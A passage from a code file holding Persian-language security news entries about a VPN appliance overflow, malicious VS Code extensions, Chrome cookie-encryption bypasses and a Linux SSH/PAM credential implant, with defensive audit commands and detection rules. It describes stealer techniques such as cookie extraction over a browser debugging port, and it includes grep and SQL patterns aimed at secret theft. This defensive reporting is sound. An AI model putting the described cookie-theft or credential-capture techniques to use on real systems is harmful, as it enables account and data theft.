    author: "تیم پژوهش آسیب‌پذیری رهام",
    featured: false,
    status: "published",
    summary:
      "در پی مشاهده ترافیک غیرعادی روی پورت‌های ۴۴۳ و ۸۴۴۳ سازمان‌ها، یک آسیب‌پذیری روز صفر از نوع سرریز بافر پیش از احراز هویت شناسایی شده که مهاجمان از آن برای نصب وب‌شل و استخراج کش رمزهای عبور دامنه اکتیو دایرکتوری استفاده می‌کنند.",
    bodyParagraphs: [
      "دستگاه‌های لبه شبکه (Edge Security Appliances) از جمله سرورهای VPN سازمانی و گیت‌وی‌های دسترسی از راه دور، به دلیل قرار گرفتن مستقیم در معرض اینترنت و عدم پشتیبانی از ایجنت‌های EDR سنتی، به هدف شماره یک گروه‌های APT تبدیل شده‌اند.",
      "بررسی فنی وصله منتشرشده نشان می‌دهد که تابع پردازش‌کننده هدرهای سفارشی در درخواست‌های اولیه نشست TLS/SSL، طول رشته ورودی کاربر را پیش از کپی کردن درون یک بافر ثابت ۵۱۲ بایتی روی پشته (Stack) بررسی نمی‌کند.",
      "مهاجم با ارسال یک درخواست HTTP POST دستکاری‌شده، قادر است آدرس بازگشت تابع را بازنویسی کرده و با زنجیره ROP یک شل معکوس یا وب‌شل دائمی در مسیر فایل‌سیستم دستگاه ایجاد نماید.",
    ],
    technicalAnalysis: [
      {
        heading: "جزئیات فنی آسیب‌پذیری و نحوه شناسایی نفوذ",
        paragraphs: [
          "نكته نگران‌کننده در این کمپین آن است که مهاجمان پس از نفوذ اولیه، حتی در صورت نصب وصله امنیتی توسط مدیر شبکه، از طریق کلیدهای خصوصی سرقت‌شده گواهینامه دستگاه و حساب‌های محلی مخفی، دسترسی خود را حفظ می‌کنند.",
        ],
        codeLabel: "بررسی لاگ‌های دسترسی غیرمجاز و فایل‌های تغییر یافته روی گیت‌وی لینوکسی",
        codeOrIoc: `# بررسی فایل‌های تغییر یافته در ۲۴ ساعت گذشته در مسیر وب‌سرور گیت‌وی:
find /var/www/ /opt/gateway/ -mtime -1 -type f -ls

# بررسی ارتباطات خروجی غیرمتعارف از پروسه اصلی سرویس VPN:
lsof -i -n -P | grep -E "sslvpnd|httpd"`,
      },
    ],
    mitigationSteps: [
      "نصب فوری آخرین وصله امنیتی منتشرشده و راه‌اندازی مجدد سرویس‌ها جهت پاکسازی حافظه موقت.",
      "ابطال (Revoke) و صدور مجدد تمامی گواهینامه‌های SSL و تغییر رمز عبور تمامی حساب‌های متصل به LDAP/RADIUS در صورت مشاهده علائم نفوذ.",
      "غیرفعال‌سازی کامل پورتال مدیریت وب (Admin Management Interface) روی اینترفیس اینترنت (WAN) و محدودسازی آن به شبکه داخلی یا جاب‌هاست (Jump Host).",
    ],
  },
  {
    id: "news-03",
    slug: "malicious-vscode-extensions-supply-chain-crypto-stealer",
    title: "شناسایی ۱۲ افزونه مخرب در مارکت‌پلیس VS Code با بیش از ۴۵ هزار نصب که کدهای استیلر و درپشتی اجرا می‌کردند",
    subtitle:
      "مهاجمان با شبیه‌سازی افزونه‌های محبوب قالب‌بندی کد، تم‌های تاریک و دستیارهای برنامه‌نویسی، کلیدهای خصوصی و فایل‌های .env توسعه‌دهندگان را به سرقت برده‌اند.",
    category: "malware",
    categoryLabel: "زنجیره تامین و بدافزار",
    severity: "HIGH",
    cveId: "Supply-Chain-VSC-2026",
    cvssScore: "8.6",
    affectedTarget: "Visual Studio Code, Cursor & VSCodium Developers",
    threatActor: "SilentExtension Group",
    date: "۵ مهر ۱۴۰۵ · ۱۷:۴۵",
    readTime: "۵ دقیقه",
    author: "واحد امنیت زنجیره تامین رهام",
    featured: false,
    status: "published",
    summary:
      "پژوهشگران امنیت زنجیره تامین موفق به کشف مجموعه‌ای هماهنگ از افزونه‌های مخرب در مارکت‌پلیس رسمی VS Code شدند که پس از نصب، در پس‌زمینه اسکریپت‌های Node.js مبهم‌شده را برای سرقت سورس‌کد و کلیدهای ابری اجرا می‌کردند.",
    bodyParagraphs: [
      "افزونه‌های محیط‌های توسعه یکپارچه (IDE Extensions) با همان سطح دسترسی کاربرِ برنامه‌نویس اجرا می‌شوند و هیچ سندباکس محدودکننده‌ای میان کد افزونه و سیستم‌عامل وجود ندارد.",
      "در این کارزار، مهاجمان ابتدا افزونه‌هایی با عملکرد واقعی (مانند فرمت‌کننده JSON و تم‌های رنگی) منتشر کرده و پس از کسب امتیاز بالا و هزاران دانلود، در یک بروزرسانی خاموش (Silent Update) کد مخرب را به رویداد `onStartupFinished` افزونه اضافه کرده‌اند.",
      "به محض باز شدن ویرایشگر کد توسط توسعه‌دهنده، افزونه مخرب تمام فضای کاری (Workspace) باز شده را برای یافتن فایل‌های `.env`، کلیدهای AWS، توکن‌های GitHub و عبارت‌های بازیابی کیف‌پول‌های رمزارز جستجو کرده و آن‌ها را از طریق بات تلگرام و سرورهای واسط تخلیه می‌کرده است.",
    ],
    technicalAnalysis: [
      {
        heading: "نحوه ممیزی افزونه‌های نصب‌شده در سیستم‌های توسعه",
        paragraphs: [
          "کد مخرب در فایل `extension.js` با تکنیک‌های رشته‌سازی پویا و رمزنگاری XOR پنهان شده بود تا اسکنرهای ایستا متوجه فراخوانی ماژول `child_process` نشوند.",
        ],
        codeLabel: "دستور بررسی لیست افزونه‌های نصب‌شده و مسیر فایل‌های آن‌ها",
        codeOrIoc: `# مشاهده لیست کامل افزونه‌های نصب شده در VS Code به همراه نسخه آن‌ها:
code --list-extensions --show-versions

# جستجوی فراخوانی‌های مشکوک شبکه یا child_process در پوشه افزونه‌ها:
grep -rnE "child_process|https.request|Telegram" ~/.vscode/extensions/`,
      },
    ],
    mitigationSteps: [
      "حذف افزونه‌های ناشناخته و محدود کردن نصب افزونه‌ها در سازمان به لیست سفید (Allowed Extensions Policy) از طریق Group Policy.",
      "غیرفعال‌سازی بروزرسانی خودکار افزونه‌های غیرضروری و بررسی ناشر (Verified Publisher) پیش از نصب.",
      "چرخش (Rotate) فوری کلیدهای API و توکن‌های موجود در فایل‌های `.env` در صورتی که افزونه مشکوکی روی سیستم نصب بوده است.",
    ],
  },
  {
    id: "news-04",
    slug: "chrome-app-bound-encryption-bypass-techniques-analysis",
    title: "تحلیل فنی: چگونه بدافزارهای نسل جدید مکانیزم App-Bound Encryption کروم را دور می‌زنند و راهکار مقابله با آن چیست؟",
    subtitle:
      "بررسی نبرد موش و گربه میان مهندسان امنیت مرورگرها و نویسندگان استیلر بر سر کلید رمزنگاری کوکی‌ها در ویندوز.",
    category: "defense",
    categoryLabel: "تحلیل فنی و دفاعی",
    severity: "HIGH",
    cveId: "Chromium-ABE-Bypass",
    cvssScore: "8.2",
    affectedTarget: "Google Chrome, Brave & Edge on Windows",
    threatActor: "Advanced Stealer Developers",
    date: "۲ مهر ۱۴۰۵ · ۱۱:۲۰",
    readTime: "۸ دقیقه",
    author: "آزمایشگاه مهندسی معکوس رهام",
    featured: false,
    status: "published",
    summary:
      "با معرفی کلیدهای v20 در کروم، سرقت ساده کوکی‌ها متوقف شد؛ اما مهاجمان با استفاده از تزریق کد به پروسه مرورگر، دیباگینگ ریموت و سوءاستفاده از COM Elevation روش‌های جدیدی برای استخراج کوکی‌ها ابداع کرده‌اند.",
    bodyParagraphs: [
      "زمانی که گوگل مکانیزم App-Bound Encryption را معرفی کرد، هدف اصلی این بود که برنامه‌های خارج از مسیر نصب کروم نتوانند از سرویس ارتفاع سطح دسترسی کروم برای رمزگشایی کلید `v20` در فایل `Local State` استفاده کنند.",
      "سرویس سیستمی کروم قبل از تحویل کلید رمزگشایی‌شده، مسیر فایل اجراییِ پروسه درخواست‌کننده و امضای آن را بررسی می‌کند. اما اگر بدافزار بتواند کد خود را به درونِ یک پروسه واقعیِ `chrome.exe` تزریق کند، یا کروم را در حالت بدون گرافیک (`--headless --remote-debugging-port`) اجرا نماید، درخواست از دید سرویس سیستمی کاملاً مجاز تلقی می‌شود.",
      "در نتیجه، دفاع در برابر استیلرهای پیشرفته نیازمند نظارت بر پارامترهای خط فرمان هنگام اجرای مرورگر و جلوگیری از باز شدن هندل `PROCESS_VM_WRITE` روی پروسه‌های مرورگر توسط برنامه‌های دیگر است.",
    ],
    technicalAnalysis: [
      {
        heading: "شناسایی سوءاستفاده از Remote Debugging Port مرورگرها",
        paragraphs: [
          "یکی از تمیزترین روش‌های استیلرها که حتی نیازی به رمزگشایی کلید `v20` ندارد، اجرای یک نمونه مخفی از مرورگر با فلگ `--remote-debugging-port` و ارسال دستور WebSocket `Network.getAllCookies` به DevTools Protocol است.",
        ],
        codeLabel: "قانون تشخیص اجرای مشکوک مرورگر با پورت دیباگینگ",
        codeOrIoc: `# شناسایی اجرای مرورگر با فلگ‌های استخراج کوکی:
SELECT pid, name, cmdline 
FROM processes 
WHERE name IN ('chrome.exe', 'msedge.exe', 'brave.exe')
  AND (cmdline LIKE '%--remote-debugging-port%' OR cmdline LIKE '%--headless%');`,
      },
    ],
    mitigationSteps: [
      "غیرفعال‌سازی قابلیت DevTools Remote Debugging در محیط‌های سازمانی از طریق سیاست‌های Group Policy مرورگر (`DeveloperToolsAvailability`).",
      "محافظت از پروسه‌های مرورگر در برابر تزریق حافظه (Process Injection) و مانیتورینگ اجرای مرورگر در حالت `--headless`.",
      "استفاده از راهکارهای قفل‌گذاری فایل کوکی در زمان بسته بودن مرورگر یا درخواست دسترسی از والد غیرمجاز.",
    ],
  },
  {
    id: "news-05",
    slug: "linux-ssh-backdoor-cloud-servers-credential-harvesting",
    title: "کشف کمپین گسترده آلوده‌سازی سرورهای لینوکسی از طریق جایگزینی باینری OpenSSH و ثبت رمزهای عبور در حافظه",
    subtitle:
      "مهاجمان پس از نفوذ اولیه، با قرار دادن ماژول PAM مخرب و اسکریپت‌های پوششی SSH، رمز عبور و کلیدهای مدیران سرور را هنگام اتصال به سرورهای دیگر سرقت می‌کنند.",
    category: "breach",
    categoryLabel: "امنیت سرور و لینوکس",
    severity: "HIGH",
    cveId: "Linux-PAM-SSH-Implant",
    cvssScore: "8.8",
    affectedTarget: "Ubuntu, Debian & RHEL Cloud Servers",
    threatActor: "CloudHopper Actors",
    date: "۲۸ شهریور ۱۴۰۵ · ۱۶:۱۰",
    readTime: "۶ دقیقه",
    author: "تیم پاسخ به رخداد و فارنزیک رهام",
    featured: false,
    status: "published",
    summary:
      "بررسی‌های فارنزیک روی سرورهای لینوکسی آسیب‌دیده نشان می‌دهد مهاجمان به جای نصب بدافزارهای پرسر و صدا، یک کتابخانه مشترک کوچک به استک احراز هویت PAM لینوکس اضافه می‌کنند که هر رمز عبوری را در لحظه ورود ذخیره و علاوه بر آن یک کلید عمومی مخفی را نیز مجاز می‌سازد.",
    bodyParagraphs: [
      "در بسیاری از زیرساخت‌های ابری، مدیران سیستم از یک سرور به سرور دیگر (Lateral Movement) با دستور `ssh` متصل می‌شوند. مهاجمان با درک این رفتار، روی سرور اول یک Alias یا Wrapper برای کلاینت `ssh` تعریف می‌کنند یا از قابلیت `LD_PRELOAD` بهره می‌گیرند.",
      "به این ترتیب، هرگاه ادمین روی سرور آلوده دستور `ssh root@second-server` را وارد می‌کند، رمز عبور یا پین کلید خصوصی او پیش از رمزنگاری در سطح شبکه، در حافظه کلاینت ثبت شده و مهاجم به کل کلاستر سرورهای سازمان دست می‌یابد.",
    ],
    technicalAnalysis: [
      {
        heading: "دستورات فارنزیک برای بررسی سلامت OpenSSH و ماژول‌های PAM",
        paragraphs: [
          "برای اطمینان از عدم دستکاری باینری‌های احراز هویت در سرورهای لینوکسی، بررسی هش فایل‌های باینری با دیتابیس پکیج‌منیجر (`dpkg -V` یا `rpm -Va`) ضروری است.",
        ],
        codeLabel: "اسکریپت ممیزی سریع یکپارچگی SSH و PAM در لینوکس",
        codeOrIoc: `# ۱. بررسی تغییر یافتن باینری‌های ssh و ماژول‌های PAM در دبیان/اوبونتو:
dpkg -V openssh-server openssh-client libpam-modules

# ۲. بررسی متغیرهای محیطی خطرناک LD_PRELOAD:
cat /etc/ld.so.preload
env | grep -i preload`,
      },
    ],
    mitigationSteps: [
      "هرگز از گزینه `ForwardAgent yes` در فایل `~/.ssh/config` برای اتصال به سرورهای میانی غیرقابل اعتماد استفاده نکنید (به جای آن از `ProxyJump -J` استفاده نمایید).",
      "غیرفعال‌سازی کامل ورود با رمز عبور (`PasswordAuthentication no`) در `/etc/ssh/sshd_config` و الزام به استفاده از کلیدهای Ed25519.",
      "بررسی دوره‌ای فایل‌های `/lib/x86_64-linux-gnu/security/` و `/etc/pam.d/common-auth` با ابزارهای پایش یکپارچگی فایل (FIM).",
    ],
  },
];
